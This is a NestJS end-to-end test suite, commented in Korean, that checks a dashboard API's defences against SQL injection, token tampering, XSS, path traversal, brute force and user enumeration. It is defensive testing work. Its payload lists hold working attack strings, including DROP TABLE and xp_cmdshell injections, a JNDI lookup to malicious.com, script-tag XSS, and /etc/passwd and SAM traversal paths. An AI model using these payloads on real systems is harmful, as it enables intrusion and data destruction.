import { Test, TestingModule } from '@nestjs/testing';
import { INestApplication } from '@nestjs/common';
import * as request from 'supertest';
import { AppModule } from '../../src/app.module';
import { getRepositoryToken } from '@nestjs/typeorm';
import { Repository } from 'typeorm';
import { User } from '../../src/user/entities/user.entity';
import { Database } from '../../src/database/entities/database.entity';

describe('Enhanced Security Testing (e2e)', () => {
  let app: INestApplication;
  let userRepository: Repository<User>;
  let databaseRepository: Repository<Database>;

  const testUser = {
    userId: 'securityuser',
    email: 'security@example.com',
    password: 'securitypassword123',
    name: 'Security Test User',
  };

  const adminUser = {
    userId: 'adminuser',
    email: 'admin@example.com',
    password: 'adminpassword123',
    name: 'Admin Test User',
  };

  let userAccessToken: string;
  let adminAccessToken: string;
  let testDatabaseId: number;

  beforeAll(async () => {
    const moduleFixture: TestingModule = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleFixture.createNestApplication();
    await app.init();

    userRepository = moduleFixture.get<Repository<User>>(getRepositoryToken(User));
    databaseRepository = moduleFixture.get<Repository<Database>>(getRepositoryToken(Database));

    // 테스트 사용자들 생성
    await userRepository.save(testUser);
    await userRepository.save(adminUser);

    // 테스트 데이터베이스 생성
    const savedDatabase = await databaseRepository.save({
      name: 'Security Test Database',
      engine: 'sqlite3',
      connectionConfig: JSON.stringify({
        filename: ':memory:',
      }),
    });
    testDatabaseId = savedDatabase.id;

    // 사용자 토큰 획득
    const userLoginResponse = await request(app.getHttpServer())
      .post('/api/auth/login')
      .send({
        userId: testUser.userId,
        password: testUser.password,
      })
      .expect(201);

    userAccessToken = userLoginResponse.body.accessToken;

    // 관리자 토큰 획득 (실제 시스템에서는 권한 기반으로 구분)
    const adminLoginResponse = await request(app.getHttpServer())
      .post('/api/auth/login')
      .send({
        userId: adminUser.userId,
        password: adminUser.password,
      })
      .expect(201);

    adminAccessToken = adminLoginResponse.body.accessToken;
  });

  afterAll(async () => {
    // 테스트 데이터 정리
    await databaseRepository.delete({});
    await userRepository.delete({});
    await app.close();
  });

  describe('SQL Injection Prevention', () => {
    const sqlInjectionPayloads = [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "1'; DELETE FROM users; --",
      'UNION SELECT * FROM users',
      "'; INSERT INTO users VALUES ('hacker', 'hacked'); --",
      "' OR 1=1#",
      "' OR 'x'='x",
      "'; EXEC xp_cmdshell('dir'); --",
      "' UNION SELECT null,username,password FROM users --",
      "admin'--",
      "admin' #",
      "admin'/*",
      "' or 1=1#",
      "' or 1=1--",
      "' or 1=1/*",
      "') or '1'='1--",
      "') or ('1'='1--",
    ];

    it.each(sqlInjectionPayloads)('should prevent SQL injection: %s', async payload => {
      const response = await request(app.getHttpServer())
        .post('/api/database/execute-query')
        .set('Authorization', `Bearer ${userAccessToken}`)
        .send({
          id: testDatabaseId,
          query: `SELECT * FROM users WHERE username = '${payload}'`,
          parameters: [],
          limit: 100,
        });

      // SQL 인젝션 시도는 차단되거나 안전하게 처리되어야 함
      expect([400, 403, 500]).toContain(response.status);

      if (response.status === 403) {
        expect(response.body.message).toContain('SQL validation failed');
      }
    });

    it('should prevent SQL injection in parameterized queries', async () => {
      const maliciousParams = [
        { value: "'; DROP TABLE users; --", type: 'string' },
        { value: "' OR '1'='1", type: 'string' },
        { value: '1; DELETE FROM users', type: 'number' },
      ];

      for (const param of maliciousParams) {
        const response = await request(app.getHttpServer())
          .post('/api/database/execute-query')
          .set('Authorization', `Bearer ${userAccessToken}`)
          .send({
            id: testDatabaseId,
            query: 'SELECT * FROM users WHERE id = ?',
            parameters: [param],
            limit: 100,
          });

        // 파라미터화된 쿼리에서도 악의적인 값은 차단되어야 함
        expect([200, 400, 403, 500]).toContain(response.status);
      }
    });

    it('should prevent DDL operations', async () => {
      const ddlQueries = [
        'CREATE TABLE malicious (id INT)',
        'DROP TABLE users',
        'ALTER TABLE users ADD COLUMN hacked VARCHAR(255)',
        'TRUNCATE TABLE users',
        'CREATE INDEX idx_malicious ON users (id)',
        'DROP INDEX idx_users',
      ];

      for (const ddlQuery of ddlQueries) {
        const response = await request(app.getHttpServer())
          .post('/api/database/execute-query')
          .set('Authorization', `Bearer ${userAccessToken}`)
          .send({
            id: testDatabaseId,
            query: ddlQuery,
            parameters: [],
            limit: 100,
          });

        // DDL 작업은 차단되어야 함
        expect([400, 403]).toContain(response.status);
      }
    });

    it('should prevent DML operations', async () => {
      const dmlQueries = [
        "INSERT INTO users VALUES (999, 'hacker', 'hacked')",
        "UPDATE users SET password = 'hacked' WHERE id = 1",
        'DELETE FROM users WHERE id > 0',
        "REPLACE INTO users VALUES (1, 'replaced', 'replaced')",
      ];

      for (const dmlQuery of dmlQueries) {
        const response = await request(app.getHttpServer())
          .post('/api/database/execute-query')
          .set('Authorization', `Bearer ${userAccessToken}`)
          .send({
            id: testDatabaseId,
            query: dmlQuery,
            parameters: [],
            limit: 100,
          });

        // DML 작업은 차단되어야 함
        expect([400, 403]).toContain(response.status);
      }
    });
  });

  describe('Authentication and Authorization Security', () => {
    it('should reject requests without authentication token', async () => {
      const protectedEndpoints = [
        { method: 'GET', path: '/api/dashboard' },
        { method: 'GET', path: '/api/widget' },
        { method: 'POST', path: '/api/widget' },
        { method: 'GET', path: '/api/database' },
        { method: 'POST', path: '/api/database' },
        { method: 'POST', path: '/api/database/execute-query' },
      ];

      for (const endpoint of protectedEndpoints) {
        let response;

        if (endpoint.method === 'GET') {
          response = await request(app.getHttpServer()).get(endpoint.path);
        } else {
          response = await request(app.getHttpServer()).post(endpoint.path).send({});
        }

        expect(response.status).toBe(401);
      }
    });

    it('should reject requests with invalid tokens', async () => {
      const invalidTokens = [
        'invalid-token',
        'Bearer invalid-token',
        'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature',
        'Bearer expired-token',
        '',
        null,
        undefined,
      ];

      for (const invalidToken of invalidTokens) {
        const response = await request(app.getHttpServer())
          .get('/api/dashboard')
          .set('Authorization', invalidToken || '');

        expect(response.status).toBe(401);
      }
    });

    it('should reject requests with tampered tokens', async () => {
      // 토큰의 페이로드를 변조한 경우
      const tamperedTokens = [
        userAccessToken.slice(0, -5) + 'XXXXX', // 서명 변조
        userAccessToken.replace(/\./g, '_'), // 구조 변조
        'Bearer ' + userAccessToken.split('.')[0] + '.tampered.' + userAccessToken.split('.')[2], // 페이로드 변조
      ];

      for (const tamperedToken of tamperedTokens) {
        const response = await request(app.getHttpServer())
          .get('/api/dashboard')
          .set('Authorization', `Bearer ${tamperedToken}`);

        expect(response.status).toBe(401);
      }
    });

    it('should handle token expiration gracefully', async () => {
      // 만료된 토큰 시뮬레이션 (실제로는 과거 시간으로 생성된 토큰)
      const expiredToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MDk0NTkyMDB9.expired';

      const response = await request(app.getHttpServer())
        .get('/api/dashboard')
        .set('Authorization', `Bearer ${expiredToken}`);

      expect(response.status).toBe(401);
    });
  });

  describe('Input Validation and Sanitization', () => {
    it('should validate and sanitize user input in widget creation', async () => {
      const maliciousInputs = [
        {
          title: '<script>alert("XSS")</script>',
          description: 'javascript:alert("XSS")',
        },
        {
          title: '${jndi:ldap://malicious.com/exploit}',
          description: '{{constructor.constructor("alert(1)")()}}',
        },
        {
          title: '<img src=x onerror=alert("XSS")>',
          description: '<iframe src="javascript:alert(1)"></iframe>',
        },
      ];

      for (const maliciousInput of maliciousInputs) {
        const response = await request(app.getHttpServer())
          .post('/api/widget')
          .set('Authorization', `Bearer ${userAccessToken}`)
          .send({
            ...maliciousInput,
            databaseId: testDatabaseId,
            componentId: 1,
            datasetType: 'DATASET',
            datasetId: 1,
            option: { type: 'line' },
          });

        // 악의적인 입력은 적절히 처리되어야 함
        if (response.status === 201) {
          // 성공한 경우 입력이 sanitized되었는지 확인
          expect(response.body.data.title).not.toContain('<script>');
          expect(response.body.data.description).not.toContain('javascript:');

          // 정리
          await request(app.getHttpServer())
            .delete(`/api/widget/${response.body.data.id}`)
            .set('Authorization', `Bearer ${userAccessToken}`);
        } else {
          // 차단된 경우 적절한 에러 응답
          expect([400, 403]).toContain(response.status);
        }
      }
    });

    it('should validate file upload sizes and types', async () => {
      // 대용량 페이로드 테스트
      const largePayload = 'A'.repeat(10 * 1024 * 1024); // 10MB

      const response = await request(app.getHttpServer())
        .post('/api/widget')
        .set('Authorization', `Bearer ${userAccessToken}`)
        .send({
          title: 'Large Payload Test',
          description: largePayload,
          databaseId: testDatabaseId,
          componentId: 1,
          datasetType: 'DATASET',
          datasetId: 1,
          option: { type: 'line' },
        });

      // 대용량 페이로드는 제한되어야 함
      expect([400, 413]).toContain(response.status);
    });

    it('should prevent path traversal attacks', async () => {
      const pathTraversalAttempts = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2f%etc%2fpasswd',
        '..%252f..%252f..%252f',
      ];

      for (const attempt of pathTraversalAttempts) {
        const response = await request(app.getHttpServer())
          .get(`/api/widget/${attempt}`)
          .set('Authorization', `Bearer ${userAccessToken}`);

        // 경로 순회 시도는 차단되어야 함
        expect([400, 404]).toContain(response.status);
      }
    });
  });

  describe('Rate Limiting and DoS Protection', () => {
    it('should handle rapid repeated requests', async () => {
      const rapidRequests = 100;
      const promises = Array.from({ length: rapidRequests }, () =>
        request(app.getHttpServer())
          .get('/api/component')
          .set('Authorization', `Bearer ${userAccessToken}`),
      );

      const responses = await Promise.all(promises);

      // 일부 요청이 rate limiting에 의해 제한될 수 있음
      const successfulRequests = responses.filter(r => r.status === 200).length;
      const rateLimitedRequests = responses.filter(r => r.status === 429).length;

      // 대부분의 요청이 처리되어야 하지만, rate limiting이 활성화될 수 있음
      expect(successfulRequests + rateLimitedRequests).toBe(rapidRequests);
    }, 15000);

    it('should prevent login brute force attacks', async () => {
      const bruteForceAttempts = 20;
      const promises = Array.from({ length: bruteForceAttempts }, () =>
        request(app.getHttpServer()).post('/api/auth/login').send({
          userId: testUser.userId,
          password: 'wrongpassword',
        }),
      );

      const responses = await Promise.all(promises);

      // 브루트 포스 시도는 대부분 실패해야 함
      const unauthorizedResponses = responses.filter(r => r.status === 401).length;
      expect(unauthorizedResponses).toBeGreaterThan(bruteForceAttempts * 0.8);

      // 정상적인 로그인이 여전히 작동하는지 확인
      const validLoginResponse = await request(app.getHttpServer()).post('/api/auth/login').send({
        userId: testUser.userId,
        password: testUser.password,
      });

      expect(validLoginResponse.status).toBe(201);
    }, 10000);
  });

  describe('Data Privacy and Information Disclosure', () => {
    it('should not expose sensitive information in error messages', async () => {
      const response = await request(app.getHttpServer())
        .post('/api/database/execute-query')
        .set('Authorization', `Bearer ${userAccessToken}`)
        .send({
          id: 99999, // 존재하지 않는 데이터베이스 ID
          query: 'SELECT * FROM users',
          parameters: [],
          limit: 100,
        });

      expect([400, 404, 500]).toContain(response.status);

      // 에러 메시지에 민감한 정보가 포함되지 않아야 함
      if (response.body.message) {
        expect(response.body.message).not.toContain('password');
        expect(response.body.message).not.toContain('secret');
        expect(response.body.message).not.toContain('key');
        expect(response.body.message).not.toContain('token');
      }
    });

    it('should not expose user information in API responses', async () => {
      const response = await request(app.getHttpServer())
        .get('/api/dashboard')
        .set('Authorization', `Bearer ${userAccessToken}`);

      if (response.status === 200 && response.body.data) {
        // 응답에 비밀번호나 민감한 정보가 포함되지 않아야 함
        const responseString = JSON.stringify(response.body);
        expect(responseString).not.toContain('password');
        expect(responseString).not.toContain('secret');
        expect(responseString).not.toContain('private');
      }
    });

    it('should prevent user enumeration attacks', async () => {
      const nonExistentUsers = ['nonexistent1', 'nonexistent2', 'nonexistent3'];
      const responses: any[] = [];

      // 존재하지 않는 사용자들로 로그인 시도
      for (const userId of nonExistentUsers) {
        const response = await request(app.getHttpServer()).post('/api/auth/login').send({
          userId: userId,
          password: 'anypassword',
        });

        responses.push(response);
      }

      // 존재하는 사용자의 잘못된 비밀번호로 로그인 시도
      const existingUserResponse = await request(app.getHttpServer()).post('/api/auth/login').send({
        userId: testUser.userId,
        password: 'wrongpassword',
      });

      // 모든 응답이 유사해야 함 (사용자 존재 여부를 알 수 없어야 함)
      responses.forEach(response => {
        expect(response.status).toBe(401);
      });

      expect(existingUserResponse.status).toBe(401);

      // 응답 메시지도 유사해야 함
      const messages = responses.map(r => r.body.message);
      const uniqueMessages = [...new Set(messages)];
      expect(uniqueMessages.length).toBeLessThanOrEqual(2); // 최대 2개의 다른 메시지
    });
  });

  describe('Cross-Site Scripting (XSS) Prevention', () => {
    it('should prevent reflected XSS in query parameters', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        'javascript:alert("XSS")',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        '"><script>alert("XSS")</script>',
      ];

      for (const payload of xssPayloads) {
        const response = await request(app.getHttpServer())
          .get(`/api/widget?search=${encodeURIComponent(payload)}`)
          .set('Authorization', `Bearer ${userAccessToken}`);

        // XSS 페이로드는 적절히 처리되어야 함
        if (response.status === 200) {
          const responseText = JSON.stringify(response.body);
          expect(responseText).not.toContain('<script>');
          expect(responseText).not.toContain('javascript:');
          expect(responseText).not.toContain('onerror=');
          expect(responseText).not.toContain('onload=');
        }
      }
    });

    it('should sanitize stored XSS in user-generated content', async () => {
      const xssTitle = '<script>alert("Stored XSS")</script>';
      const xssDescription = '<img src=x onerror=alert("XSS")>';

      const createResponse = await request(app.getHttpServer())
        .post('/api/widget')
        .set('Authorization', `Bearer ${userAccessToken}`)
        .send({
          title: xssTitle,
          description: xssDescription,
          databaseId: testDatabaseId,
          componentId: 1,
          datasetType: 'DATASET',
          datasetId: 1,
          option: { type: 'line' },
        });

      if (createResponse.status === 201) {
        // 저장된 내용이 sanitized되었는지 확인
        expect(createResponse.body.data.title).not.toContain('<script>');
        expect(createResponse.body.data.description).not.toContain('onerror=');

        // 조회 시에도 sanitized된 내용이 반환되는지 확인
        const getResponse = await request(app.getHttpServer())
          .get(`/api/widget/${createResponse.body.data.id}`)
          .set('Authorization', `Bearer ${userAccessToken}`);

        if (getResponse.status === 200) {
          expect(getResponse.body.data.title).not.toContain('<script>');
          expect(getResponse.body.data.description).not.toContain('onerror=');
        }

        // 정리
        await request(app.getHttpServer())
          .delete(`/api/widget/${createResponse.body.data.id}`)
          .set('Authorization', `Bearer ${userAccessToken}`);
      }
    });
  });

  describe('Business Logic Security', () => {
    it('should prevent unauthorized data access', async () => {
      // 다른 사용자의 데이터에 접근 시도
      const unauthorizedIds = [999999, -1, 0, 'invalid'];

      for (const id of unauthorizedIds) {
        const response = await request(app.getHttpServer())
          .get(`/api/dashboard/${id}`)
          .set('Authorization', `Bearer ${userAccessToken}`);

        expect([400, 404]).toContain(response.status);
      }
    });

    it('should validate business rule constraints', async () => {
      // 비즈니스 로직 위반 시도 (예: 음수 ID, 잘못된 형식 등)
      const invalidWidgetData = {
        title: '', // 빈 제목
        description: 'A'.repeat(10000), // 너무 긴 설명
        databaseId: -1, // 음수 ID
        componentId: 0, // 무효한 ID
        datasetType: 'INVALID_TYPE',
        datasetId: -999,
        option: null, // null 옵션
      };

      const response = await request(app.getHttpServer())
        .post('/api/widget')
        .set('Authorization', `Bearer ${userAccessToken}`)
        .send(invalidWidgetData);

      expect([400, 422]).toContain(response.status);
    });
  });
});
